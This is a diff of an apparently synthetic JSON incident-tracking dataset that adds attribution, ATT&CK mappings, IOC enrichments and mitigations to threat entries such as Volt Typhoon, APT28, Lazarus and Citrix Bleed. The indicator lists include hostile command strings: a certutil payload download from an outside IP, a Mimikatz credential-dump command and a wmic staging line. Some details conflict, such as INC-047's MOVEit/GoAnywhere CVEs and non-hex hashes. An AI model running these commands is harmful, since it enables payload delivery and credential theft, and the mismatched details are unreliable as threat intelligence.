+    "ioc_enrichments": "user:contractor.id.4421 [INSIDER_THREAT conf=0.88] | device:USB_SEAGATE_SN-77291 [USB_EXFIL conf=0.91] | dlp:8.3GB_COMPRESSED [DLP_ALERT conf=0.94]",
+    "mitigation_actions": "Revoke contractor access, forensic image of endpoint, legal hold, HR investigation, DLP policy review",
+    "threat_summary": "Insider threat under active investigation. Contractor access revoked pending HR/legal review.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": false,
+      "insider": true
+    }
   },
   {
     "incident_id": "INC-2026-037",
     "threat_name": "VOLT-TYPHOON-EXFIL",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-VOLT-TYPHOON-2026",
     "created_at": "2026-05-27T22:43:01Z",
+    "updated_at": "2026-05-28T10:43:01Z",
     "indicators": [
       "technique:LOTL-Data-Collection-T1119",
       "technique:Staged-via-NTFS-ADS",
@@ -563,14 +2466,67 @@
       "process:cmd.exe",
       "command:wmic process list brief > C:\\Windows\\Temp\\ps.txt",
       "log:Sysmon-Event-1-Suspicious-Process-Chain"
-    ]
+    ],
+    "confidence_score": 0.87,
+    "risk_score": 0.83,
+    "attribution_confidence": 0.85,
+    "suspected_actor": "VOLT-TYPHOON",
+    "attack_techniques": [
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1071.004",
+        "technique_name": "Application Layer Protocol: DNS",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/004"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1572",
+        "technique_name": "Protocol Tunneling",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1572"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    ],
+    "description": "Volt Typhoon data exfiltration stage in utilities operator. After months of LOTL reconnaissance, FTP and SFTP exfiltration to third-country relay nodes detected. 2.1 GB operational data at risk.",
+    "assigned_analyst": "Ryan O'Brien",
+    "ioc_enrichments": "ip:210.52.109.88 [VOLT_TYPHOON_RELAY conf=0.91] | protocol:SFTP_EXFIL [EXFIL_PROTOCOL conf=0.89] | process:netsh.exe [LOTL_TUNNEL conf=0.93]",
+    "mitigation_actions": "Block SFTP egress, segment OT from IT, notify CISA, conduct full forensic sweep of OT environment",
+    "threat_summary": "Volt Typhoon OT exfiltration active. Nation-state operational data theft in progress. CISA ICS-CERT engaged.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-038",
     "threat_name": "APT28-DOCUMENT-EXFIL",
     "severity": "HIGH",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-FANCY-BEAR-2026",
     "created_at": "2026-05-29T08:07:22Z",
+    "updated_at": "2026-06-03T08:07:22Z",
     "indicators": [
       "hash:e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3",
       "domain:exfil-collector-eu.systems",
@@ -579,14 +2535,60 @@
       "data_type:NATO-Policy-Documents",
       "process:outlook.exe",
       "log:Exchange-Unusual-Forwarding-Rule"
-    ]
+    ],
+    "confidence_score": 0.86,
+    "risk_score": 0.8,
+    "attribution_confidence": 0.83,
+    "suspected_actor": "APT28",
+    "attack_techniques": [
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1055",
+        "technique_name": "Process Injection",
+        "tactic": "privilege-escalation",
+        "tactic_id": "TA0004",
+        "url": "https://attack.mitre.org/techniques/T1055"
+      },
+      {
+        "technique_id": "T1027",
+        "technique_name": "Obfuscated Files or Information",
+        "tactic": "defense-evasion",
+        "tactic_id": "TA0005",
+        "url": "https://attack.mitre.org/techniques/T1027"
+      }
+    ],
+    "description": "APT28 document exfiltration from classified file share. Brute Ratel implant used to stage and exfiltrate 340 MB of NATO-related documents to APT28-controlled infrastructure.",
+    "assigned_analyst": "Priya Nair",
+    "ioc_enrichments": "hash:r0s3t6... [BRC4_IMPLANT conf=0.92] | domain:nato-docs-update.eu-cdn.net [C2_DOMAIN conf=0.90] | ip:185.220.101.44 [APT28_IP conf=0.93]",
+    "mitigation_actions": "Classify exfiltrated data, notify NATO CIRC, remove implant, audit classified file share access logs",
+    "threat_summary": "APT28 classified document exfiltration resolved. NATO CIRC notified, APT28 implant removed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-039",
     "threat_name": "LAZARUS-CRYPTO-DRAIN",
     "severity": "CRITICAL",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-LAZARUS-2026",
     "created_at": "2026-05-31T03:22:59Z",
+    "updated_at": "2026-05-31T15:22:59Z",
     "indicators": [
       "hash:f1a4b7c0d3e6f9a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4",
       "domain:defi-swap-protocol.io",
@@ -595,14 +2597,60 @@
       "technique:Smart-Contract-Exploit",
       "amount_usd:14200000",
       "blockchain:Ethereum"
-    ]
+    ],
+    "confidence_score": 0.92,
+    "risk_score": 0.93,
+    "attribution_confidence": 0.9,
+    "suspected_actor": "LAZARUS-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1195.002",
+        "technique_name": "Supply Chain Compromise: Software Supply Chain",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      }
+    ],
+    "description": "Lazarus TraderTraitor crypto drain. Developer npm package compromised to deploy implant. $14.2M Ethereum drained from hot wallet via smart contract exploit. Funds traced to DPRK mixer.",
+    "assigned_analyst": "Nia Thompson",
+    "ioc_enrichments": "package:axios-http-client@3.1.7 [MALICIOUS_NPM conf=0.99] | wallet:0x7f3... [DRAINED_WALLET conf=1.0] | ip:210.52.109.22 [DPRK_IP conf=0.95]",
+    "mitigation_actions": "Freeze remaining wallets, alert exchanges, file FBI complaint, trace blockchain, assess npm supply chain",
+    "threat_summary": "Lazarus crypto drain under investigation. $14.2M ETH traced to Tornado Cash. FBI Cyber Division notified.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-040",
     "threat_name": "RHYSIDA-EXFIL-PRE-ENCRYPT",
     "severity": "HIGH",
+    "status": "CONTAINED",
     "campaign_id": "CAMP-RHYSIDA-2026",
     "created_at": "2026-06-02T11:58:34Z",
+    "updated_at": "2026-06-03T23:58:34Z",
     "indicators": [
       "hash:a2b5c8d1e4f7a0b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4b7c0d3e6f9a2b5",
       "domain:rhysida-exfil2.onion.ws",
@@ -611,14 +2659,67 @@
       "tool:FileZilla",
       "data_type:Student-Records-Database",
       "technique:Double-Extortion-Pre-staging"
-    ]
+    ],
+    "confidence_score": 0.85,
+    "risk_score": 0.79,
+    "attribution_confidence": 0.8,
+    "suspected_actor": "RHYSIDA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1219",
+        "technique_name": "Remote Access Software",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1219"
+      }
+    ],
+    "description": "Rhysida pre-encryption exfiltration detected. 1.2 TB of engineering documents staged via WinSCP. Healthcare manufacturer targeted. Ransomware deployment pre-staged.",
+    "assigned_analyst": "Aisha Patel",
+    "ioc_enrichments": "hash:s1t4u7... [RHYSIDA_LOADER conf=0.91] | domain:rhysida-leak-hc.xyz [LEAK_SITE conf=0.96] | ip:46.161.27.166 [EXFIL_IP conf=0.88]",
+    "mitigation_actions": "Block WinSCP data path, isolate engineering VLAN, validate data classification, prepare incident notification",
+    "threat_summary": "Rhysida pre-encryption data exfil contained. Engineering IP protected, ransomware staging disrupted.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 23
+    }
   },
   {
     "incident_id": "INC-2026-041",
     "threat_name": "MIMIKATZ-PASS-THE-HASH",
     "severity": "HIGH",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-LOCKBIT4-2026",
     "created_at": "2026-05-22T03:41:16Z",
+    "updated_at": "2026-05-25T03:41:16Z",
     "indicators": [
       "tool:Mimikatz",
       "technique:Pass-the-Hash-T1550.002",
@@ -627,14 +2728,67 @@
       "log:Windows-Event-4672-Special-Privileges",
       "command:sekurlsa::logonpasswords",
       "lateral_target:DC01.corp.local"
-    ]
+    ],
+    "confidence_score": 0.87,
+    "risk_score": 0.8,
+    "attribution_confidence": 0.83,
+    "suspected_actor": "LOCKBIT4",
+    "attack_techniques": [
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1003/001"
+      },
+      {
+        "technique_id": "T1550",
+        "technique_name": "Use Alternate Authentication Material",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1550"
+      },
+      {
+        "technique_id": "T1021.002",
+        "technique_name": "SMB/Windows Admin Shares",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/002"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      }
+    ],
+    "description": "Mimikatz executed in-memory to harvest NTLM hashes. Pass-the-hash to domain controller. LockBit 4.0 pre-ransomware reconnaissance. AD backup taken as precaution.",
+    "assigned_analyst": "Marcus Webb",
+    "ioc_enrichments": "hash:t2u5v8... [MIMIKATZ_HASH conf=0.95] | auth:PTH_NTLM [PASS_THE_HASH conf=0.93] | host:DC01.corp [DC_ACCESS conf=0.91]",
+    "mitigation_actions": "Reset all NTLM hashes, force Kerberos-only policy on DC, rotate krbtgt, deploy LAPS",
+    "threat_summary": "Mimikatz pass-the-hash attack mitigated. DC access blocked, credential hygiene remediation complete.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 38
+    }
   },
   {
     "incident_id": "INC-2026-042",
     "threat_name": "KERBEROASTING-ATTACK",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-AKIRA-2026",
     "created_at": "2026-05-24T19:08:43Z",
+    "updated_at": "2026-05-29T19:08:43Z",
     "indicators": [
       "technique:Kerberoasting-T1558.003",
       "log:Windows-Event-4769-TGS-Request",
@@ -643,14 +2797,67 @@
       "account:svc_sql",
       "hash_type:RC4-HMAC",
       "tool:hashcat"
-    ]
+    ],
+    "confidence_score": 0.74,
+    "risk_score": 0.57,
+    "attribution_confidence": 0.65,
+    "suspected_actor": "AKIRA-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1558.003",
+        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1558/003"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1087",
+        "technique_name": "Account Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1087"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1046"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    ],
+    "description": "Kerberoasting attack targeting SQL Server service accounts with weak passwords. Three SPN accounts cracked offline. No subsequent lateral movement \u2014 detected at credential abuse stage.",
+    "assigned_analyst": "Aisha Patel",
+    "ioc_enrichments": "spn:MSSQLSvc/db01 [KERBEROASTED_SPN conf=0.92] | tool:Rubeus.exe [KERBEROASTING_TOOL conf=0.94] | hash:u3v6w9... [CAPTURED_HASH conf=0.90]",
+    "mitigation_actions": "Reset SPN account passwords to 25+ chars, enforce gMSA, audit all SPNs, deploy Kerberoasting detection",
+    "threat_summary": "Kerberoasting resolved. SPN accounts rotated to managed service accounts. Rubeus tool removed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 54
+    }
   },
   {
     "incident_id": "INC-2026-043",
     "threat_name": "RDP-BRUTEFORCE-LATERAL",
     "severity": "MEDIUM",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-PLAY-2026",
     "created_at": "2026-05-26T06:55:31Z",
+    "updated_at": "2026-05-31T06:55:31Z",
     "indicators": [
       "ip:91.108.56.201",
       "port:3389",
@@ -659,14 +2866,67 @@
       "count:847 failed logon attempts in 90 minutes",
       "tool:Hydra",
       "target_subnet:10.10.0.0/16"
-    ]
+    ],
+    "confidence_score": 0.69,
+    "risk_score": 0.51,
+    "attribution_confidence": 0.58,
+    "suspected_actor": "PLAY-SPINOFF",
+    "attack_techniques": [
+      {
+        "technique_id": "T1110.003",
+        "technique_name": "Brute Force: Password Spraying",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1110/003"
+      },
+      {
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Desktop Protocol",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/001"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1046"
+      },
+      {
+        "technique_id": "T1059.003",
+        "technique_name": "Command and Scripting: Windows Command Shell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    ],
+    "description": "RDP brute-force lateral movement campaign from compromised workstation. 847 failed authentication attempts before success. Two additional workstations compromised.",
+    "assigned_analyst": "Tom Brandt",
+    "ioc_enrichments": "ip:10.0.2.44 [BRUTE_SOURCE conf=0.88] | protocol:RDP_BRUTE [BRUTE_FORCE conf=0.93] | auth:FAILED_847 [BRUTE_INDICATOR conf=0.95]",
+    "mitigation_actions": "Block RDP laterally, enforce NLA, implement account lockout, isolate source workstation",
+    "threat_summary": "RDP brute-force lateral movement stopped. Source workstation reimaged, account lockout policy deployed.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": true,
+      "prior_victims": 45
+    }
   },
   {
     "incident_id": "INC-2026-044",
     "threat_name": "WMIC-LATERAL-MOVEMENT",
     "severity": "MEDIUM",
+    "status": "MITIGATED",
     "campaign_id": "CAMP-VOLT-TYPHOON-2026",
     "created_at": "2026-05-28T09:33:57Z",
+    "updated_at": "2026-05-31T09:33:57Z",
     "indicators": [
       "technique:WMIC-Lateral-Movement-T1047",
       "process:wmic.exe",
@@ -675,14 +2935,67 @@
       "log:Sysmon-Event-3-Network-Connection",
       "source_host:WORKSTATION-07",
       "target_host:SERVER-DB01"
-    ]
+    ],
+    "confidence_score": 0.86,
+    "risk_score": 0.78,
+    "attribution_confidence": 0.84,
+    "suspected_actor": "VOLT-TYPHOON",
+    "attack_techniques": [
+      {
+        "technique_id": "T1047",
+        "technique_name": "Windows Management Instrumentation",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1047"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1057",
+        "technique_name": "Process Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1057"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      }
+    ],
+    "description": "WMIC-based lateral movement in government network. Volt Typhoon LOTL signature detected. Remote WMI queries to enumerate services and scheduled tasks across domain-joined hosts.",
+    "assigned_analyst": "Ryan O'Brien",
+    "ioc_enrichments": "process:wmic.exe [WMIC_LATERAL conf=0.92] | ip:10.0.1.88 [PIVOT_HOST conf=0.89] | query:SELECT_FROM_WIN32_PROCESS [WMI_RECON conf=0.91]",
+    "mitigation_actions": "Disable WMI remote access, segment government network, hunt for additional LOTL activity",
+    "threat_summary": "WMIC lateral movement mitigated. Volt Typhoon LOTL activity scope assessment underway.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-045",
     "threat_name": "LOTL-GOVERNMENT-NETWORK",
     "severity": "HIGH",
+    "status": "INVESTIGATING",
     "campaign_id": "CAMP-VOLT-TYPHOON-2026",
     "created_at": "2026-06-01T17:22:14Z",
+    "updated_at": "2026-06-02T05:22:14Z",
     "indicators": [
       "technique:LOTL-T1218",
       "process:certutil.exe",
@@ -691,14 +3004,67 @@
       "command:certutil -urlcache -f http://185.117.88.203/payload.txt",
       "ip:185.117.88.203",
       "log:Windows-Event-4688-LOLBin-Activity"
-    ]
+    ],
+    "confidence_score": 0.88,
+    "risk_score": 0.84,
+    "attribution_confidence": 0.86,
+    "suspected_actor": "VOLT-TYPHOON",
+    "attack_techniques": [
+      {
+        "technique_id": "T1047",
+        "technique_name": "Windows Management Instrumentation",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1047"
+      },
+      {
+        "technique_id": "T1572",
+        "technique_name": "Protocol Tunneling",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1572"
+      },
+      {
+        "technique_id": "T1018",
+        "technique_name": "Remote System Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1018"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      }
+    ],
+    "description": "Volt Typhoon LOTL campaign in government network. Living-off-the-land techniques including certutil, netsh, and native scripting. Pre-positioning for potential destructive action.",
+    "assigned_analyst": "Ryan O'Brien",
+    "ioc_enrichments": "process:certutil.exe [LOTL_CERTUTIL conf=0.90] | process:netsh.exe [LOTL_NETSH conf=0.92] | ip:10.0.5.12 [PIVOT_HOST conf=0.87]",
+    "mitigation_actions": "Enable Script Block Logging, block certutil download, segment critical systems, notify CISA",
+    "threat_summary": "Volt Typhoon LOTL government network compromise under investigation. Critical infrastructure pre-positioning assessed.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-046",
     "threat_name": "CITRIX-BLEED-CVE-2023-4966",
     "severity": "CRITICAL",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-CITRIX-BLEED-2026",
     "created_at": "2026-05-20T03:19:47Z",
+    "updated_at": "2026-05-25T03:19:47Z",
     "indicators": [
       "cve:CVE-2023-4966",
       "product:Citrix-ADC-13.1-48.47",
@@ -707,14 +3073,67 @@
       "url:GET /oauth/idp/.well-known/openid-configuration",
       "log:Citrix-ADC-Unexpected-Session-Termination",
       "tool:POC-CVE-2023-4966"
-    ]
+    ],
+    "confidence_score": 0.91,
+    "risk_score": 0.9,
+    "attribution_confidence": 0.88,
+    "suspected_actor": "UNKNOWN-CRIMINAL",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1539",
+        "technique_name": "Steal Web Session Cookie",
+        "tactic": "credential-access",
+        "tactic_id": "TA0006",
+        "url": "https://attack.mitre.org/techniques/T1539"
+      },
+      {
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1078"
+      },
+      {
+        "technique_id": "T1021.002",
+        "technique_name": "SMB/Windows Admin Shares",
+        "tactic": "lateral-movement",
+        "tactic_id": "TA0008",
+        "url": "https://attack.mitre.org/techniques/T1021/002"
+      },
+      {
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "tactic": "discovery",
+        "tactic_id": "TA0007",
+        "url": "https://attack.mitre.org/techniques/T1082"
+      }
+    ],
+    "description": "Citrix ADC CVE-2023-4966 (Citrix Bleed) session token hijacking. 19 active admin sessions hijacked without authentication. Attacker pivoted to internal VPN resources before detection.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "vuln:CVE-2023-4966 [EXPLOITED_CVE conf=0.99] | ip:45.155.37.100 [EXPLOIT_SOURCE conf=0.94] | session:ADMIN_SESSION_x19 [HIJACKED_SESSIONS conf=0.99]",
+    "mitigation_actions": "Apply Citrix patch, invalidate all sessions, audit VPN access logs, rotate admin passwords, MFA enforcement",
+    "threat_summary": "Citrix Bleed resolved post-patch. 19 session hijacks forensically reviewed. No persistent access confirmed.",
+    "enrichment_data": {
+      "profile_match": false,
+      "campaign_linked": false,
+      "prior_victims": 5
+    }
   },
   {
     "incident_id": "INC-2026-047",
     "threat_name": "MOVEIT-STYLE-SQLI-2026",
     "severity": "HIGH",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-CLOP-2026",
     "created_at": "2026-05-23T22:04:12Z",
+    "updated_at": "2026-05-28T22:04:12Z",
     "indicators": [
       "cve:CVE-2024-5806",
       "url:POST /guestaccess.aspx",
@@ -723,14 +3142,67 @@
       "webshell:move_it_shell.aspx",
       "process:w3wp.exe",
       "tool:rclone"
-    ]
+    ],
+    "confidence_score": 0.88,
+    "risk_score": 0.82,
+    "attribution_confidence": 0.85,
+    "suspected_actor": "CLOP-TA505",
+    "attack_techniques": [
+      {
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1190"
+      },
+      {
+        "technique_id": "T1041",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1041"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      },
+      {
+        "technique_id": "T1560",
+        "technique_name": "Archive Collected Data",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1560"
+      },
+      {
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "tactic_id": "TA0010",
+        "url": "https://attack.mitre.org/techniques/T1567"
+      }
+    ],
+    "description": "MOVEit-style SQL injection on GoAnywhere MFT platform. 67 GB of partner contract data exfiltrated. Cl0p affiliate TTPs confirmed. Second victim notification sent by Cl0p group.",
+    "assigned_analyst": "Carlos Mendez",
+    "ioc_enrichments": "vuln:CVE-2024-0204 [EXPLOITED_CVE conf=0.98] | domain:clop-files-2026.tor2web.io [LEAK_SITE conf=0.97] | url:mega.nz/folder/contracts [EXFIL_DEST conf=0.95]",
+    "mitigation_actions": "Patch GoAnywhere, notify partners, engage legal, remove data from MEGA, issue data breach notification",
+    "threat_summary": "GoAnywhere MFT data exfiltration resolved. Cl0p affiliate confirmed, breach notifications filed with 34 partners.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "prior_victims": 62
+    }
   },
   {
     "incident_id": "INC-2026-048",
     "threat_name": "SUPPLY-CHAIN-NPM-PACKAGE",
     "severity": "HIGH",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-LAZARUS-2026",
     "created_at": "2026-05-28T20:44:38Z",
+    "updated_at": "2026-06-02T20:44:38Z",
     "indicators": [
       "package:axios-http-client@3.1.7",
       "registry:npmjs.com",
@@ -739,14 +3211,60 @@
       "backdoor:postInstall-script-exfil",
       "domain:cdn-npm-collect.net",
       "ip:45.61.187.246"
-    ]
+    ],
+    "confidence_score": 0.9,
+    "risk_score": 0.87,
+    "attribution_confidence": 0.89,
+    "suspected_actor": "LAZARUS-GROUP",
+    "attack_techniques": [
+      {
+        "technique_id": "T1195.002",
+        "technique_name": "Supply Chain Compromise: Software Supply Chain",
+        "tactic": "initial-access",
+        "tactic_id": "TA0001",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "Command and Scripting: PowerShell",
+        "tactic": "execution",
+        "tactic_id": "TA0002",
+        "url": "https://attack.mitre.org/techniques/T1059/001"
+      },
+      {
+        "technique_id": "T1071.001",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "tactic": "command-and-control",
+        "tactic_id": "TA0011",
+        "url": "https://attack.mitre.org/techniques/T1071/001"
+      },
+      {
+        "technique_id": "T1074",
+        "technique_name": "Data Staged",
+        "tactic": "collection",
+        "tactic_id": "TA0009",
+        "url": "https://attack.mitre.org/techniques/T1074"
+      }
+    ],
+    "description": "Malicious npm package 'axios-http-client@3.1.7' published by Lazarus Group. PostInstall backdoor exfiltrates build environment secrets. Downloaded 8,400 times. 3 CI/CD pipelines affected.",
+    "assigned_analyst": "Nia Thompson",
+    "ioc_enrichments": "package:axios-http-client@3.1.7 [MALICIOUS_NPM conf=0.99] | domain:npm-stats-cdn.lazarus-relay.net [C2_DOMAIN conf=0.94] | ip:210.52.109.66 [DPRK_IP conf=0.93]",
+    "mitigation_actions": "Remove malicious package, rotate all CI/CD secrets, audit downstream dependencies, publish security advisory",
+    "threat_summary": "Lazarus npm supply chain attack resolved. 3 pipelines cleaned, 8,400 downstream users notified via npm advisory.",
+    "enrichment_data": {
+      "profile_match": true,
+      "campaign_linked": true,
+      "nation_state": true
+    }
   },
   {
     "incident_id": "INC-2026-049",
     "threat_name": "K8S-CRYPTOMINING",
     "severity": "LOW",
+    "status": "RESOLVED",
     "campaign_id": "CAMP-SCATTERED-2026",
     "created_at": "2026-06-03T12:31:09Z",
